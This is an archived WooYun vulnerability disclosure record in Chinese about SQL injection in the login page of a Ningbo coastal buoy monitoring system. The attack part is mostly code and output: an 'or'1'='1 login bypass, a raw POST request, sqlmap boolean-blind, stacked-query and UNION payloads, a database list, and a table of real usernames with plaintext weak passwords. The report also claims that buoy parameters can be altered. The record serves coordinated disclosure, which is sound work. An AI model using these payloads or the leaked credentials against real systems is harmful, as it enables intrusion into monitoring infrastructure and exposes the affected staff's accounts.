{"id": 76711, "wybug_id": "wooyun-2015-0164236", "wybug_title": "某市近岸海域某系统SQL注入可控制浮标参数", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2015-12-27 15:44", "wybug_open_date": "2016-02-12 18:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-12：\t细节向公众公开  简要描述： 没想到还有这样的系统 详细说明：  宁波市近岸海域浮标实时监测系统\n**.**.**.**\n在password参数存在注入,admin/123456密码输入后弹窗\n\n当用户名以admin/'or'1'='1输入时，直接跳转到下一个登陆界面\n\n存在注入\nPOST / HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: **.**.**.**/Cookie: ASP.NET_SessionId=2bq2mpwhsnbehaol2tqtcciyConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 300__VIEWSTATE=%2FwEPDwUKMTMwNDA5ODc3OWQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFBWNoZWNrIRN8GSC1GLyErfjalwrsj%2FfeXWv575mIBFlTWoY1V1c%3D&__EVENTVALIDATION=%2FwEWBQKbwZKKAQL3xJvhBALS9cL8AgLb84nODgKDkOvcBIOqX04h8uJoKEokA5a6GpdjezmTPzTESAVI6ReKoH7p&txt_UserName=admin&txt_Password=123456*&btn_Login=\n\nParameter: #1* ((custom) POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: __VIEWSTATE=/wEPDwUKMTMwNDA5ODc3OWQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFBWNoZWNrIRN8GSC1GLyErfjalwrsj/feXWv575mIBFlTWoY1V1c=&__EVENTVALIDATION=/wEWBQKbwZKKAQL3xJvhBALS9cL8AgLb84nODgKDkOvcBIOqX04h8uJoKEokA5a6GpdjezmTPzTESAVI6ReKoH7p&txt_UserName=admin&txt_Password='or'1'='1' AND 9310=9310 AND 'YdOG'='YdOG&btn_Login=    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: __VIEWSTATE=/wEPDwUKMTMwNDA5ODc3OWQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFBWNoZWNrIRN8GSC1GLyErfjalwrsj/feXWv575mIBFlTWoY1V1c=&__EVENTVALIDATION=/wEWBQKbwZKKAQL3xJvhBALS9cL8AgLb84nODgKDkOvcBIOqX04h8uJoKEokA5a6GpdjezmTPzTESAVI6ReKoH7p&txt_UserName=admin&txt_Password='or'1'='1';WAITFOR DELAY '0:0:5'--&btn_Login=    Type: UNION query    Title: Generic UNION query (NULL) - 29 columns    Payload: __VIEWSTATE=/wEPDwUKMTMwNDA5ODc3OWQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFBWNoZWNrIRN8GSC1GLyErfjalwrsj/feXWv575mIBFlTWoY1V1c=&__EVENTVALIDATION=/wEWBQKbwZKKAQL3xJvhBALS9cL8AgLb84nODgKDkOvcBIOqX04h8uJoKEokA5a6GpdjezmTPzTESAVI6ReKoH7p&txt_UserName=admin&txt_Password='or'1'='1-2030' UNION ALL SELECT 84,CHAR(113)+CHAR(98)+CHAR(112)+CHAR(98)+CHAR(113)+CHAR(82)+CHAR(107)+CHAR(113)+CHAR(86)+CHAR(100)+CHAR(84)+CHAR(89)+CHAR(85)+CHAR(109)+CHAR(121)+CHAR(66)+CHAR(68)+CHAR(85)+CHAR(99)+CHAR(85)+CHAR(83)+CHAR(88)+CHAR(105)+CHAR(100)+CHAR(90)+CHAR(103)+CHAR(87)+CHAR(73)+CHAR(83)+CHAR(107)+CHAR(100)+CHAR(108)+CHAR(89)+CHAR(103)+CHAR(108)+CHAR(97)+CHAR(75)+CHAR(117)+CHAR(117)+CHAR(77)+CHAR(67)+CHAR(110)+CHAR(83)+CHAR(76)+CHAR(73)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(113)+CHAR(113),84,84,84,84,84,84,84,84,84,84,84,84,84,84,84,84,84,84,84,84,84,84,84,84,84,84,84-- -&btn_Login=---[14:35:07] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET 4.0.30319, Microsoft IIS 7.5, ASP.NETback-end DBMS: Microsoft SQL Server 2008\n\navailable databases [9]:[*] distribution[*] GoogleMap[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] Test\n   漏洞证明：  找到googlemap数据库之后得到user信息，基本上全是弱口令，这只是一部分\n+----------+----------+| username | password |+----------+----------+| admin    | csiccsic || fenghq   | 1        || hzq      | qiang    || lin      | domain   || momoman  | zxy      || shigd    | 1        || tj       | tangjun  || wjh      | wjh      || xuxz     | 123456   || xxzx     | 1        || zhouyj   | 1        |+----------+----------+\n\n\n可对浮标进行删除和修改部分参数管理\n\n\n\n\n\n   修复方案：  修复注入，弱口令改一下吧   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-12-31 17:43 厂商回复： CNVD确认所述漏洞情况，已经转由CNCERT下发浙江分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}